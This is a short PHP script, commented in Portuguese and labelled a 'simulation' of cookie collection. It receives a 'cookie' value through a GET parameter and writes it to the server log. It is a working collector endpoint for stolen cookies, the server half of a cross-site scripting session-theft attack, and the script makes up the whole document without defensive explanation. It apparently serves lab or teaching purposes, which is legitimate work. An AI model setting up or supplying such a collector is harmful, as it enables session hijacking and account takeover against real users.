<?php
// Simulação de coleta de cookies
if(isset($_GET['cookie'])) {
    // Escreve no log do servidor
    error_log("Cookie recebido: " . $_GET['cookie']);
    
    // Resposta para o "cliente" (pode ser vazia)
    echo "Cookie registrado no log!";
} else {
    echo "Nenhum cookie recebido.";
}
?>
